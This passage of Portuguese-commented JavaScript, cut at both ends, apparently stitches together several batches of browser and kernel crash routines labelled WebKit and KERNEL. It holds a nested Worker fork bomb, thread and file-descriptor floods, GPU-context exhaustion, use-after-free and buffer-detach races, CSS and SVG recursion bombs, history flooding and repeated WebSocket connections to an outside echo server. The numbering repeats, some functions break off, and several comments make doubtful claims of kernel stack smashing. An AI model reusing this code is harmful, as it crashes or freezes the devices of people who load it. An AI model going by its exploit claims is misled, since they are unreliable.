            log("[KERNEL] Iniciando UDP Zero-Packet Flood...");
            
            if (!window.RTCPeerConnection) return log("WebRTC off.");
            
            const pc = new RTCPeerConnection();
            const dc = pc.createDataChannel("flood", {ordered: false, maxRetransmits: 0});
            
            // Payload Vazio (0 bytes)
            // Força alocação de mbuf header sem cluster de dados
            const empty = new Uint8Array(0);
            
            dc.onopen = () => {
                log("Canal aberto. Disparando pacotes vazios...");
                const interval = setInterval(() => {
                    if (dc.bufferedAmount < 1024 * 1024) {
                        for(let i=0; i<1000; i++) dc.send(empty);
                    }
                }, 5);
                
                setTimeout(() => {
                    clearInterval(interval);
                    pc.close();
                    log("UDP Zero Flood finalizado.");
                }, 5000);
            };
            
            pc.createOffer().then(o => pc.setLocalDescription(o));
        }

        // --- TESTE 5: LocalStorage Locking Storm (Kernel) ---
        function runStorageStorm() {
            log("[KERNEL] Iniciando SQLite Lock Storm...");
            
            const workerCode = `
                onmessage = () => {
                    setInterval(() => {
                        // Tenta adquirir lock de escrita no DB
                        try {
                            localStorage.setItem("storm", Math.random());
                        } catch(e) {}
                    }, 0);
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // 50 Workers competindo pelo mesmo ficheiro
            for(let i=0; i<50; i++) {
                new Worker(url).postMessage("go");
            }
            log("50 Workers a martelar o LocalStorage. I/O deve bloquear.");
        }

        // --- TESTE 6: Zombie Thread Termination Flood (Kernel) ---
        function runZombieThreads() {
            log("[KERNEL] Criando Threads Zumbis...");
            
            const workerCode = `
                // Loop infinito matemático (User Mode puro)
                // Difícil para o Kernel interromper sem sinal forçado
                while(true) { Math.sin(Math.random()); }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let count = 0;
            const interval = setInterval(() => {
                const w = new Worker(url);
                
                // Deixa rodar um pouco e mata
                setTimeout(() => {
                    w.terminate();
                }, 50);
                
                count++;
                if (count % 10 === 0) log(`Threads cicladas: ${count}`);
                
                if (count > 100) {
                    clearInterval(interval);
                    log("Teste Zombie finalizado. Verifique se o sistema ficou lento.");
                }
            }, 100);
        }

// --- TESTE 1: MessagePort Entangled Cycle GC ---
        function runPortCycle() {
            log("[WebKit] Criando Ciclo de Portas (IPC GC)...");
            
            // Cria ciclo complexo distribuído
            const ch1 = new MessageChannel();
            const ch2 = new MessageChannel();
            
            // Porta 1 segura Porta 2
            ch1.port1.postMessage("entangle", [ch2.port1]);
            
            // Porta 2 segura Porta 1 (Ciclo)
            ch2.port2.postMessage("entangle", [ch1.port2]);
            
            log("Ciclo criado. Libertando referências...");
            
            // Solta tudo para o GC
            // O WebKit tem um GC especial para portas que cruzam threads
            // Se falhar, as portas ficam "zumbis" ou crasham ao tentar fechar
            window.gc_trigger = { a: ch1, b: ch2 }; // Mantém vivo por um instante
            setTimeout(() => {
                window.gc_trigger = null;
                // Aloca memória para forçar GC
                const junk = new ArrayBuffer(1024 * 1024 * 50);
                log("GC forçado. Verifique estabilidade.");
            }, 100);
        }

        // --- TESTE 2: HTMLForm Recursive Submit ---
        function runFormRecursion() {
            log("[WebKit] Iniciando Form Recursion...");
            
            const form = document.createElement('form');
            form.action = "#";
            document.body.appendChild(form);
            
            let depth = 0;
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                depth++;
                if (depth < 2000) {
                    // requestSubmit constrói o payload do form nativamente
                    // Recursão aqui gasta stack C++
                    try { form.requestSubmit(); } catch(x){}
                } else {
                    log("Limite de recursão atingido.");
                }
            });
            
            try {
                log("Disparando submit chain...");
                form.requestSubmit();
            } catch(e) {
                log("Erro Form: " + e.message);
            }
            document.body.removeChild(form);
        }

        // --- TESTE 3: CanvasPattern Video UAF ---
        function runPatternUAF() {
            log("[WebKit] Iniciando Pattern UAF...");
            const ctx = document.getElementById('c').getContext('2d');
            
            const video = document.createElement('video');
            // Vídeo dummy válido (base64 curto mp4)
            video.src = "data:video/mp4;base64,AAAAHGZ0eXBtcDQyAAAAAG1wNDJpc29tAAAAAAAD"; 
            
            // Tenta criar padrão assim que possível
            setTimeout(() => {
                try {
                    const ptrn = ctx.createPattern(video, 'repeat');
                    ctx.fillStyle = ptrn;
                    
                    // Desenha massivamente
                    for(let i=0; i<1000; i++) {
                        ctx.fillRect(0,0,500,500);
                        
                        // O GOLPE: Mata o vídeo no meio do desenho
                        if (i === 500) {
                            log("Destruindo fonte do vídeo...");
                            video.src = "";
                            video.load();
                        }
                    }
                    log("Desenho finalizado.");
                } catch(e) {
                    log("Erro Pattern: " + e.message);
                }
            }, 100);
        }

        // --- TESTE 4: Reverse DNS Stack Smash (Kernel) ---
        function runReverseDNS() {
            log("[KERNEL] Iniciando Reverse DNS Stress...");
            
            if (!window.RTCPeerConnection) return log("WebRTC off.");
            
            // Tenta forçar logs de conexão com IPs bizarros
            // IPv6 malformado gigante para estourar buffers de log/netdb
            const badIP = "2001:" + "db8:".repeat(500) + "1";
            
            const pc = new RTCPeerConnection({
                iceServers: [{urls: `stun:[${badIP}]:3478`}]
            });
            
            pc.createOffer().catch(e => {
                // Erro esperado, mas o Kernel tentou processar a string?
                log("Oferta criada/falhou (Seguro).");
            });
            
            setTimeout(() => pc.close(), 1000);
        }

        // --- TESTE 5: GPU Query Object Exhaustion (Kernel) ---
        function runGPUQueries() {
            log("[KERNEL] Esgotando GPU Queries...");
            
            const gl = document.getElementById('gl').getContext('webgl2'); // WebGL2 para queries
            if (!gl) return log("WebGL2 necessário para Query Objects.");
            
            const queries = [];
            let count = 0;
            
            const interval = setInterval(() => {
                try {
                    // Aloca 500 handles por ciclo
                    for(let i=0; i<500; i++) {
                        const q = gl.createQuery();
                        gl.beginQuery(gl.ANY_SAMPLES_PASSED, q);
                        gl.endQuery(gl.ANY_SAMPLES_PASSED);
                        queries.push(q);
                        count++;
                    }
                    log(`Queries ativas: ${count}`);
                } catch(e) {
                    log("Falha GPU (Limite atingido): " + e.message);
                    clearInterval(interval);
                }
                
                if (count > 50000) {
                    clearInterval(interval);
                    log("Teste GPU finalizado.");
                }
            }, 50);
        }

        // --- TESTE 6: File Descriptor Storm (Kernel) ---
        function runFDStorm() {
            log("[KERNEL] Iniciando FD Storm (MessageChannels)...");
            
            const channels = [];
            let count = 0;
            
            const interval = setInterval(() => {
                // Cada canal gasta 2 FDs (pipes)
                try {
                    for(let i=0; i<100; i++) {
                        const mc = new MessageChannel();
                        channels.push(mc); // Mantém referência para não fechar
                        count += 2;
                    }
                    if (count % 1000 === 0) log(`FDs abertos: ~${count}`);
                } catch(e) {
                    log("Limite FD atingido (EMFILE): " + e.message);
                    clearInterval(interval);
                    
                    // Tenta abrir algo mais para confirmar falha global
                    try { new Worker(""); } catch(x) { log("Sistema instável: Não abre Workers."); }
                }
            }, 10);
        }
function runMSERace() {
            log("[WebKit] Iniciando MSE Detach Race...");
            
            if (!window.MediaSource) return log("MSE API off.");
            
            const ms = new MediaSource();
            const url = URL.createObjectURL(ms);
            const video = document.createElement('video');
            video.src = url;
            
            ms.onsourceopen = () => {
                try {
                    const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E, mp4a.40.2"');
                    const buf = new Uint8Array(1024 * 1024); // 1MB buffer
                    
                    // Worker para roubar o buffer
                    const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/javascript"})));
                    
                    // O GOLPE: appendBuffer lê o buffer.
                    // postMessage transfere (detach) o buffer.
                    // Tenta fazer os dois ao mesmo tempo.
                    sb.appendBuffer(buf);
                    w.postMessage(buf.buffer, [buf.buffer]);
                    
                    log("Race executada. Se não crashar, seguro.");
                    w.terminate();
                } catch(e) {
                    log("Erro MSE: " + e.message);
                }
            };
        }

        // --- TESTE 2: WebAssembly Memory Grow Race ---
        function runWasmGrow() {
            log("[WebKit] Iniciando Wasm Grow Race...");
            
            if (!window.WebAssembly) return log("Wasm off.");
            
            // Memória partilhada
            const memory = new WebAssembly.Memory({ initial: 1, maximum: 100, shared: true });
            const view = new Int32Array(memory.buffer);
            
            const workerCode = `
                onmessage = (e) => {
                    const mem = e.data;
                    const view = new Int32Array(mem.buffer);
                    // Tenta escrever enquanto a memória é realocada (grow) na main thread
                    setInterval(() => {
                        try { view[0] = 0xDEADBEEF; } catch(x){}
                    }, 0);
                }
            `;
            const w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
            w.postMessage(memory);
            
            let i = 0;
            const interval = setInterval(() => {
                try {
                    memory.grow(1);
                    i++;
                    if (i > 50) {
                        clearInterval(interval);
                        w.terminate();
                        log("Wasm Grow Race finalizada.");
                    }
                } catch(e) {
                    clearInterval(interval);
                    log("Wasm Limit: " + e.message);
                }
            }, 10);
        }

        // --- TESTE 3: Map Rehash Heap Overflow ---
        function runMapRehash() {
            log("[WebKit] Enchendo Map para Rehash...");
            
            const map = new Map();
            const limit = 200000;
            
            try {
                // Insere objetos para forçar uso de memória no heap
                for(let i=0; i<limit; i++) {
                    map.set({id: i}, i);
                    if (i % 50000 === 0) log(`Map size: ${i}`);
                }
                
                log("Forçando limpeza e re-inserção...");
                // Limpa e enche de novo para fragmentar o alocador do Map
                map.clear();
                for(let i=0; i<limit; i++) {
                    map.set("key"+i, "val"+i);
                }
                
                log("Map Stress testado.");
            } catch(e) {
                log("Erro Map (OOM?): " + e.message);
            }
        }

        // --- TESTE 4: IPv6 Address Stack Smash (Kernel) ---
        function runIPv6Smash() {
            log("[KERNEL] Iniciando IPv6 Stack Smash...");
            
            // Gera um "endereço IPv6" malformado gigante
            // O Kernel pode tentar validar isso em buffers na stack
            const part = "FFFF:";
            const hugeIP = "[" + part.repeat(1000) + "1]"; // ~5000 chars
            
            try {
                log("Conectando a IPv6 gigante...");
                // fetch tenta resolver o host
                fetch("http://" + hugeIP).catch(e => {
                    log("Fetch falhou (Esperado): " + e.message);
                });
                
                // Tenta WebSocket também (usa syscalls diferentes)
                const ws = new WebSocket("ws://" + hugeIP);
                ws.onerror = () => {};
                
            } catch(e) {
                log("Erro Rede: " + e.message);
            }
        }

        // --- TESTE 5: IPC Circular Serialization Panic (Kernel) ---
        function runIPCSerialize() {
            log("[KERNEL] Testando IPC Circular Panic...");
            
            const channel = new MessageChannel();
            
            // Cria objeto circular profundo
            const a = { next: null };
            const b = { prev: a };
            a.next = b;
            
            // Aninha profundamente
            let curr = a;
            for(let i=0; i<1000; i++) {
                curr.val = { next: curr };
                curr = curr.val;
            }
            
            try {
                log("Enviando objeto circular complexo...");
                // O Kernel tenta serializar. Se a deteção de ciclo falhar ou estourar a stack...
                channel.port1.postMessage(a);
                
                // Fecha imediatamente para interromper a serialização no meio
                channel.port1.close();
                log("Envio feito.");
            } catch(e) {
                log("Erro IPC: " + e.message);
            }
        }

        // --- TESTE 6: GPU Context Handle Exhaustion (Kernel) ---
        function runGPUExhaust() {
            log("[KERNEL] Esgotando Contextos GPU...");
            
            const container = document.getElementById('canvases');
            let count = 0;
            
            const interval = setInterval(() => {
                // Cria canvas
                const c = document.createElement('canvas');
                c.width = 16; c.height = 16;
                container.appendChild(c);
                
                // Tenta obter contexto WebGL
                const gl = c.getContext('webgl');
                
                if (gl) {
                    count++;
                    // Força alocação de recurso
                    gl.clearColor(Math.random(), 0, 0, 1);
                    gl.clear(gl.COLOR_BUFFER_BIT);
                } else {
                    // Limite atingido?
                    // Não removemos os canvas para segurar os handles
                    log(`Contexto falhou. Total ativos: ${count}`);
                    // Continua tentando para stressar o driver
                }
                
                if (count % 20 === 0) log(`Contextos: ${count}`);
                
                // Se conseguirmos muitos, removemos alguns para tentar fragmentar
                if (container.childNodes.length > 100) {
                    container.removeChild(container.firstChild);
                }
                
                if (count > 500) {
                    clearInterval(interval);
                    log("Teste GPU finalizado.");
                }
            }, 50);
        }
 // --- TESTE 1: BigInt64Array Constructor Poisoning ---
        function runBigIntPoison() {
            log("[WebKit] Iniciando BigInt Poison...");
            
            try {
                // Objeto iterável malicioso
                const poison = {
                    length: 100, // Diz que tem 100 itens
                    [Symbol.iterator]: function*() {
                        for(let i=0; i<100; i++) {
                            yield BigInt(i);
                            // No meio da iteração, tenta invalidar o alvo? 
                            // Como não temos acesso direto ao buffer sendo construído, 
                            // tentamos causar pressão de GC ou exceções.
                            if (i == 50) {
                                log("Meio da iteração. Trigger...");
                                // Tenta alocar muita memória para forçar movimento de heap
                                const junk = new ArrayBuffer(1024*1024);
                            }
                        }
                    }
                };
                
                log("Construindo BigInt64Array...");
                const arr = new BigInt64Array(poison);
                log("Array criado (Seguro).");
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: TransformStream Buffer Detach ---
        function runStreamDetach() {
            log("[WebKit] Iniciando Stream Detach...");
            
            if (!window.TransformStream) return log("Streams API off.");
            
            const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
            
            const ts = new TransformStream({
                transform(chunk, controller) {
                    log("Transformando chunk...");
                    // O GOLPE: Transfere o chunk para o worker
                    // O chunk se torna inutilizável (byteLength 0) na main thread
                    w.postMessage(chunk.buffer, [chunk.buffer]);
                    
                    // Tenta enfileirar o chunk "morto"
                    controller.enqueue(chunk);
                }
            });
            
            const writer = ts.writable.getWriter();
            const buffer = new Uint8Array([1, 2, 3, 4]);
            
            writer.write(buffer).catch(e => log("Write failed (Expected): " + e));
            
            // Tenta ler o resultado
            const reader = ts.readable.getReader();
            reader.read().then(res => {
                log("Leitura feita (Se chunk vazio, seguro).");
            }).catch(e => log("Leitura falhou: " + e));
        }

        // --- TESTE 3: CSS Complex Selector DoS ---
        function runCSSBomb() {
            log("[WebKit] Criando Seletor Complexo...");
            
            const style = document.createElement('style');
            const depth = 2000;
            
            // Cria :not(:not(:not(...)))
            let selector = "div";
            for(let i=0; i<depth; i++) selector += ":not(.c)";
            
            style.textContent = `${selector} { color: red; }`;
            
            const div = document.createElement('div');
            document.body.appendChild(div);
            
            log("Injetando regra CSS...");
            document.head.appendChild(style);
            
            // Força Recalc
            setTimeout(() => {
                const color = getComputedStyle(div).color;
                log("CSS Engine sobreviveu.");
                document.head.removeChild(style);
                document.body.removeChild(div);
            }, 100);
        }

        // --- TESTE 4: Blob.slice Recursive Stack Smash (Kernel) ---
        function runBlobStack() {
            log("[KERNEL] Iniciando Blob Stack Smash...");
            
            let blob = new Blob(["base"]);
            
            // Cria cadeia de referência: Blob -> Blob -> Blob...
            // O VFS precisa resolver a cadeia para ler os dados
            for(let i=0; i<5000; i++) {
                // Slice(0, 1) cria um novo blob referenciando o anterior
                blob = blob.slice(0, 1); 
            }
            
            log("Cadeia de 5000 slices criada. Lendo...");
            
            const reader = new FileReader();
            reader.readAsText(blob);
            
            reader.onload = () => log("Leitura OK (VFS seguro).");
            reader.onerror = () => log("Erro Leitura.");
        }

        // --- TESTE 5: Nested Worker Fork Bomb (Kernel) ---
        function runForkBomb() {
            log("[KERNEL] Iniciando Nested Fork Bomb...");
            
            const workerCode = `
                if (location.hash.length < 10) { // Limite de profundidade para não matar o browser instantaneamente
                    const depth = (parseInt(location.hash.substring(1)) || 0) + 1;
                    const blob = new Blob(["(" + arguments.callee.toString() + ")()"], {type: "text/javascript"});
                    const url = URL.createObjectURL(blob);
                    
                    // Cria 2 filhos
                    new Worker(url + "#" + depth);
                    new Worker(url + "#" + depth);
                    
                    // Mantém vivo
                    setInterval(()=>{}, 1000);
                }
            `;
            
            const blob = new Blob([workerCode], {type: "text/javascript"});
            const url = URL.createObjectURL(blob);
            
            // Inicia a árvore
            new Worker(url);
            
            log("Fork Bomb iniciada. O sistema deve travar em breve.");
        }

        // --- TESTE 6: Fetch Upload Stall (Kernel) ---
        function runUploadStall() {
            log("[KERNEL] Iniciando Upload Stall...");
            
            // Payload 10MB
            const data = new Uint8Array(10 * 1024 * 1024).fill(65);
            
            // 50 conexões
            let count = 0;
            const interval = setInterval(() => {
                if (count >= 50) { clearInterval(interval); return; }
                
                // Envia para um endpoint que aceita mas demora (ou loopback)
                // Usamos POST para forçar envio de dados
                fetch("/stall_" + count, {
                    method: "POST",
                    body: data,
                    mode: "no-cors"
                }).catch(()=>{});
                
                count++;
                if (count % 10 === 0) log(`Uploads pendentes: ${count}`);
                
            }, 100);
        }
function runISOCrash() {
            log("[WebKit] Iniciando ISO-2022-JP Attack...");
            
            try {
                const dec = new TextDecoder("iso-2022-jp");
                
                // Sequências de escape para trocar de modo (ASCII <-> Kanji)
                // ESC $ B (Kanji), ESC ( B (ASCII)
                const switchKanji = [0x1B, 0x24, 0x42];
                const switchAscii = [0x1B, 0x28, 0x42];
                
                // Cria buffer que troca de estado milhares de vezes sem dados reais
                const size = 100000;
                const buf = new Uint8Array(size * 3);
                
                for(let i=0; i<size; i++) {
                    const seq = (i % 2 === 0) ? switchKanji : switchAscii;
                    buf.set(seq, i * 3);
                }
                
                log("Decodificando stream de estado caótico...");
                // decode() deve manter o estado. O excesso de transições pode corromper.
                dec.decode(buf, {stream: true});
                
                // Finaliza com sequência quebrada
                dec.decode(new Uint8Array([0x1B, 0x24])); 
                
                log("Decoder sobreviveu.");
            } catch(e) {
                log("Erro Decoder: " + e.message);
            }
        }

        // --- TESTE 2: CSS calc() Cyclic Dependency Lock ---
        function runCSSCycle() {
            log("[WebKit] Criando Ciclo CSS...");
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = `
                <div id="parent" style="display:flex;">
                    <div id="child">TEST</div>
                </div>
            `;
            
            const p = document.getElementById('parent');
            const c = document.getElementById('child');
            
            // Ciclo: Parent width depende de Child width (via flex content)
            // Child width depende de Parent width (via calc %)
            // Adicionamos variação para forçar recálculo contínuo
            
            setTimeout(() => {
                log("Aplicando CSS tóxico...");
                // Tenta travar a thread de layout
                p.style.width = "min-content"; 
                c.style.width = "calc(100% + 10px)"; 
                
                // Força leitura
                const w = p.offsetWidth;
                log("Layout calculado (Seguro).");
            }, 100);
        }

        // --- TESTE 3: RegExp Unicode Property Flood ---
        function runRegexFlood() {
            log("[WebKit] Compilando Regex Unicode Massiva...");
            
            try {
                // Lista de scripts Unicode
                const scripts = ["Han", "Latin", "Greek", "Cyrillic", "Arabic", "Hebrew", "Hiragana", "Katakana"];
                let pattern = "";
                
                // Repete propriedades para gerar uma árvore de decisão gigante no compilador
                for(let i=0; i<2000; i++) {
                    const script = scripts[i % scripts.length];
                    pattern += `\\p{Script=${script}}|`;
                }
                pattern += "a";
                
                log("Compilando...");
                // A flag 'u' ativa o modo Unicode
                const re = new RegExp(pattern, "u");
                
                log("Testando string...");
                re.test("a");
                log("Regex OK.");
                
            } catch(e) {
                log("Erro Regex: " + e.message);
            }
        }

        // --- TESTE 4: MessageChannel GC Storm (Kernel) ---
        function runSocketGC() {
            log("[KERNEL] Iniciando Socket GC Storm...");
            
            let count = 0;
            const interval = setInterval(() => {
                // Cria 1000 canais por ciclo
                for(let i=0; i<1000; i++) {
                    const mc = new MessageChannel();
                    // Entrelaça as portas para criar referência circular (Cross-thread)
                    // O Kernel precisa detetar que ambos os lados estão inalcançáveis
                    mc.port1.postMessage("cycle", [mc.port2]);
                    
                    // Descarta referência JS imediatamente
                }
                
                count += 1000;
                if (count % 5000 === 0) log(`Canais criados e descartados: ${count}`);
                
                if (count > 50000) {
                    clearInterval(interval);
                    
                    // Força alocação para disparar GC do JS, que por sua vez notifica o Kernel
                    const buffer = new ArrayBuffer(50 * 1024 * 1024);
                    log("Teste finalizado. Aguardando limpeza do Kernel...");
                }
            }, 50);
        }

        // --- TESTE 5: History Session Exhaustion (Kernel) ---
        function runHistoryDoS() {
            log("[KERNEL] Enchendo Sessão de Histórico...");
            
            const state = { data: "A".repeat(1024) }; // 1KB state
            let count = 0;
            
            const interval = setInterval(() => {
                try {
                    // pushState adiciona nova entrada. O sistema limita o número?
                    // Ou crasha por OOM no processo pai?
                    for(let i=0; i<100; i++) {
                        history.pushState(state, "", "/flood_" + count);
                        count++;
                    }
                    
                    if (count % 5000 === 0) log(`Entradas no histórico: ${count}`);
                    
                } catch(e) {
                    log("Limite atingido: " + e.message);
                    clearInterval(interval);
                }
            }, 10);
        }

        // --- TESTE 6: Worker Termination Signal Race (Kernel) ---
        function runSignalRace() {
            log("[KERNEL] Iniciando Signal Race...");
            
            const workerCode = `
                onmessage = () => {
                    // Loop infinito (bloqueia thread)
                    while(true) {}
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            const workers = [];
            
            // Lança 10 workers bloqueados
            for(let i=0; i<10; i++) {
                const w = new Worker(url);
                w.postMessage("start"); // Bloqueia o worker
                workers.push(w);
            }
            
            log("Workers bloqueados. Terminando e enviando mensagens...");
            
            // Race: Terminar vs Enviar Mensagem
            // O Kernel está a enviar SIGKILL. Nós tentamos escrever no pipe do socket.
            workers.forEach(w => {
                setTimeout(() => {
                    w.terminate(); // Envia sinal
                    // Tenta escrever no pipe de uma thread morta/morrendo
                    try { w.postMessage("race"); } catch(e){}
                }, 100);
            });
            
            setTimeout(() => log("Race executada."), 2000);
        }
// --- TESTE 1: AudioWorklet Module Load Race ---
        function runAudioRace() {
            log("[WebKit] Iniciando AudioWorklet Race...");
            
            if (!window.AudioWorklet) return log("AudioWorklet off.");
            
            try {
                // Cria contexto
                let ctx = new AudioContext();
                
                // Código do processador
                const blob = new Blob([`
                    registerProcessor('noise', class extends AudioWorkletProcessor {
                        process(inputs, outputs) { return true; }
                    });
                `], {type: 'application/javascript'});
                const url = URL.createObjectURL(blob);
                
                // Adiciona módulo
                const p = ctx.audioWorklet.addModule(url);
                
                // O GOLPE: Fecha o contexto IMEDIATAMENTE enquanto o módulo carrega na outra thread
                setTimeout(() => {
                    log("Fechando contexto durante load...");
                    ctx.close();
                    ctx = null;
                }, 0);
                
                p.then(() => log("Módulo carregou (Race falhou, seguro)."))
                 .catch(e => log("Erro Load: " + e.message));
                 
            } catch(e) {
                log("Erro Audio: " + e.message);
            }
        }

        // --- TESTE 2: SVG Filter Cyclic Recursion ---
        function runSVGCycle() {
            log("[WebKit] Criando SVG Filter Cycle...");
            const box = document.getElementById('svg-box');
            box.innerHTML = "";
            
            const ns = "http://www.w3.org/2000/svg";
            const svg = document.createElementNS(ns, "svg");
            const defs = document.createElementNS(ns, "defs");
            
            // Filtro A refere B
            const fA = document.createElementNS(ns, "filter");
            fA.id = "filterA";
            const imgA = document.createElementNS(ns, "feImage");
            imgA.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#filterB");
            fA.appendChild(imgA);
            
            // Filtro B refere A (Ciclo)
            const fB = document.createElementNS(ns, "filter");
            fB.id = "filterB";
            const imgB = document.createElementNS(ns, "feImage");
            imgB.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#filterA");
            fB.appendChild(imgB);
            
            defs.appendChild(fA);
            defs.appendChild(fB);
            svg.appendChild(defs);
            
            // Elemento alvo
            const rect = document.createElementNS(ns, "rect");
            rect.setAttribute("width", "100");
            rect.setAttribute("height", "100");
            rect.setAttribute("filter", "url(#filterA)"); // Gatilho
            
            svg.appendChild(rect);
            box.appendChild(svg);
            
            log("SVG injetado. Verifique crash.");
            
            setTimeout(() => {
                box.innerHTML = "";
                log("SVG Test finalizado.");
            }, 2000);
        }

        // --- TESTE 3: Intl.Segmenter Iterator UAF ---
        function runSegmenterUAF() {
            log("[WebKit] Iniciando Segmenter UAF...");
            
            if (!window.Intl || !Intl.Segmenter) return log("Segmenter off.");
            
            try {
                const seg = new Intl.Segmenter("ja", {granularity: "word"});
                let str = "????????"; // String base
                
                const segments = seg.segment(str);
                const iter = segments[Symbol.iterator]();
                
                // Avança um pouco
                iter.next();
                
                log("Iterador ativo. Destruindo string original...");
                
                // Tenta remover referência à string original
                str = null;
                
                // Aloca memória para sobrescrever
                const junk = new Array(10000).fill(1.1);
                
                // Tenta continuar a iterar
                const res = iter.next();
                log("Iteração continuou: " + (res.value ? res.value.segment : "Fim"));
                
            } catch(e) {
                log("Erro Intl: " + e.message);
            }
        }

        // --- TESTE 4: Wasm mprotect Thrashing (Kernel) ---
        function runWasmProtect() {
            log("[KERNEL] Iniciando Wasm mprotect Thrashing...");
            
            if (!window.WebAssembly) return log("Wasm off.");
            
            // Binário Wasm mínimo (Magic + Version)
            const wasmCode = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]);
            
            let count = 0;
            const interval = setInterval(() => {
                try {
                    // Compilar e instanciar força o Kernel a:
                    // 1. Alocar memória RW
                    // 2. Escrever código JIT/Optimizado
                    // 3. Chamar mprotect(RW -> RX)
                    // 4. Executar
                    // 5. Desalocar
                    for(let i=0; i<50; i++) {
                        new WebAssembly.Instance(new WebAssembly.Module(wasmCode));
                    }
                    count += 50;
                    if (count % 1000 === 0) log(`Módulos Wasm: ${count}`);
                } catch(e) {
                    log("Wasm falhou: " + e.message);
                    clearInterval(interval);
                }
                
                if (count > 10000) {
                    clearInterval(interval);
                    log("mprotect Thrash finalizado.");
                }
            }, 10);
        }

        // --- TESTE 5: Canvas Path VRAM Leak (Kernel) ---
        function runCanvasLeak() {
            log("[KERNEL] Iniciando Canvas Path Leak...");
            
            const ctx = document.getElementById('c').getContext('2d');
            
            let count = 0;
            const interval = setInterval(() => {
                // Cria caminho complexo
                ctx.beginPath();
                for(let i=0; i<1000; i++) {
                    ctx.lineTo(Math.random()*1000, Math.random()*1000);
                }
                // Preenche (usa GPU tessellation)
                ctx.fillStyle = "red";
                ctx.fill();
                
                // Limpa (deve libertar buffers)
                ctx.clearRect(0,0,1000,1000);
                
                count++;
                if (count % 500 === 0) log(`Ciclos de Desenho: ${count}`);
                
                if (count > 5000) {
                    clearInterval(interval);
                    log("Canvas Test finalizado.");
                }
            }, 5);
        }

        // --- TESTE 6: Socket Linger Ghost Close (Kernel) ---
        function runLingerGhost() {
            log("[KERNEL] Iniciando Linger Ghost...");
            
            const data = new Uint8Array(1024).fill(65);
            let count = 0;
            
            const interval = setInterval(() => {
                try {
                    const ws = new WebSocket("wss://echo.websocket.org");
                    
                    ws.onopen = () => {
                        // Envia dados
                        ws.send(data);
                        // Fecha com dados ainda no buffer de saída
                        // Isso força o Kernel a decidir: Esperar (Linger) ou RST?
                        ws.close(); 
                    };
                    ws.onerror = () => {};
                    
                    count++;
                } catch(e) {}
                
                if (count > 500) {
                    clearInterval(interval);
                    log("Teste Linger finalizado.");
                }
            }, 10);
        }
// --- TESTE 1: History Back vs Iframe Destroy Race ---
        function runHistoryRace() {
            log("[WebKit] Iniciando History Race...");
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = "";
            
            const ifr = document.createElement('iframe');
            sandbox.appendChild(ifr);
            
            // Cria histórico no iframe
            ifr.src = window.location.href + "#1";
            
            setTimeout(() => {
                ifr.src = window.location.href + "#2";
                
                setTimeout(() => {
                    log("Voltando no histórico e destruindo iframe...");
                    // 1. Inicia navegação (Assíncrono no processo Web)
                    try { ifr.contentWindow.history.back(); } catch(e){}
                    
                    // 2. Destroi o contexto de navegação (Imediato)
                    // O HistoryController pode tentar callback no frame morto
                    sandbox.removeChild(ifr);
                    
                    log("Race executada.");
                }, 500);
            }, 500);
        }

        // --- TESTE 2: CSS Viewport Unit Recursion ---
        function runViewportLoop() {
            log("[WebKit] Iniciando Viewport Loop...");
            
            const style = document.createElement('style');
            // Se a largura for pequena, remove scrollbar. Se for grande, adiciona scrollbar.
            // Scrollbar altera '100vw'. '100vw' altera a largura. Ciclo.
            style.textContent = `
                #v-bomb {
                    width: 100vw;
                    height: 100vh;
                    overflow: auto;
                }
                #content {
                    width: 110vw; /* Força scroll horizontal se scrollbar vertical aparecer? */
                    height: 110vh;
                }
                @media (max-width: 1000px) {
                    #content { height: 90vh; } /* Remove scroll */
                }
            `;
            document.head.appendChild(style);
            
            const div = document.createElement('div');
            div.id = "v-bomb";
            div.innerHTML = "<div id='content'></div>";
            document.body.appendChild(div);
            
            log("Layout instável injetado. Verifique travamento.");
            
            setTimeout(() => {
                document.head.removeChild(style);
                document.body.removeChild(div);
                log("Teste CSS finalizado.");
            }, 5000);
        }

        // --- TESTE 3: DataView Getter Poisoning ---
        function runDataViewPoison() {
            log("[WebKit] Iniciando DataView Poison...");
            
            try {
                const buffer = new ArrayBuffer(16);
                const view = new DataView(buffer);
                
                // Define getter malicioso no protótipo (afeta todos os ArrayBuffers)
                Object.defineProperty(ArrayBuffer.prototype, 'byteLength', {
                    get: function() {
                        log("Getter ativado! Tentando detach...");
                        // Se possível, transfere o buffer aqui
                        try {
                            const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
                            w.postMessage(this, [this]); 
                            w.terminate();
                        } catch(e) {}
                        return 16; // Mente sobre o tamanho
                    },
                    configurable: true
                });
                
                log("Lendo DataView...");
                // O DataView verifica byteLength. O nosso getter roda e mata o buffer.
                // O C++ continua e lê memória morta?
                view.getInt8(0);
                
                log("Leitura segura (ou falhou antes).");
                delete ArrayBuffer.prototype.byteLength; // Limpa
                
            } catch(e) {
                log("Erro: " + e.message);
                delete ArrayBuffer.prototype.byteLength;
            }
        }

        // --- TESTE 4: Worker Stack Clash (Kernel) ---
        function runStackClash() {
            log("[KERNEL] Iniciando Stack Clash (Recursion)...");
            
            const workerCode = `
                function recurse(i) {
                    // Aloca variáveis na stack
                    const v = new Float64Array(100); 
                    try {
                        recurse(i+1);
                    } catch(e) {
                        // Se capturar RangeError, é JS Stack limit.
                        // Queremos estourar a thread stack nativa antes disso.
                    }
                }
                recurse(0);
            `;
            
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança vários workers para colocar stacks adjacentes na memória
            for(let i=0; i<20; i++) {
                new Worker(url);
            }
            log("Workers recursivos lançados. Aguarde impacto.");
        }

        // --- TESTE 5: Kqueue Event Filter Exhaustion (Kernel) ---
        function runKqueueFlood() {
